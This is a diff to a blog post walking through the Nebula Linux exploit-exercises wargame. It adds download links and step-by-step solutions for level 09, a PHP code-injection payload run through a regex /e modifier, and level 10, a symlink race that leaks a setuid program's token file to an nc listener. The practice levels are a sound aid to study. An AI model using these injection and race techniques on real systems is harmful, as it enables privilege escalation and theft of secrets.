@@ -118,7 +118,7 @@
 
       <div class="read-time">
         <small>
-          5 minute read
+          6 minute read
         </small>
       </div>
 
@@ -140,8 +140,12 @@ Binary compilation failures
 
 At the end of Nebula, the user will have a reasonably thorough understanding of local attacks against Linux systems, and a cursory look at some of the remote attacks that are possible.
 
-official website:   https://exploit-exercises.com/nebula/  
-some witeup:    https://lightless.me/archives/Nebula-writeup.html
+official website:       https://exploit-exercises.com/nebula/  
+nebula.iso download:    http://pan.baidu.com/s/1dFdRIm9
+some witeup:    
+                        google--&gt;cache:https://lightless.me/archives/Nebula-writeup.html
+                        or
+                        http://pan.baidu.com/s/1mhQgqCg
 </code></pre>
 </div>
 
@@ -349,6 +353,57 @@ link knowledge:
     use hex dump view to find 7f==&gt;. is backspace
     su - flag08
     pass:backd00Rmate
+    getflag
+</code></pre>
+</div>
+
+<h4 id="x09-level09">0x09 level09</h4>
+<div class="highlighter-rouge"><pre class="highlight"><code>mykey:
+    vi /tmp/level09.txt
+    ----content----
+    [email {${system($use_me)}}]
+    -----end-------
+    cd /home/flag09
+    ./flag09 /tmp/level09.txt getflag
+</code></pre>
+</div>
+
+<h4 id="x10-level10">0x10 level10</h4>
+<div class="highlighter-rouge"><pre class="highlight"><code>mykey:
+    vi /tmp/level10_1
+    ----conent------
+    #!/bin/sh
+    while true;
+    do
+        ln -sf /tmp/level10_2 /tmp/level10_3
+        ln -sf /home/flag10/token /tmp/level10_3
+    done
+    ----end---------
+    touch /tmp/level10_2
+    touch /tmp/level10_3
+    chmod +x /tmp/level10_1
+    vi /tmp/level10_11
+    ------content------
+    #!/bin/sh
+    while true;
+    do
+        /home/flag10/flag10 /tmp/level10_3 192.168.2.140
+    done
+    -----end-----------
+    chmod +x /tmp/level10_3
+    use another terminal:
+        nc -lv 18211
+    use another terminal:
+        ssh level10@192.168.2.140
+        pass:level10
+        /tmp/level10_1
+    use another terminal:
+        ssh level10@192.168.2.140
+        pass:level10
+        /tmp/level10_11
+    find the terminal with nc -lv 18211 received the content of token
+    su - flag10
+    pass:content of token
     getflag
 </code></pre>
 </div>
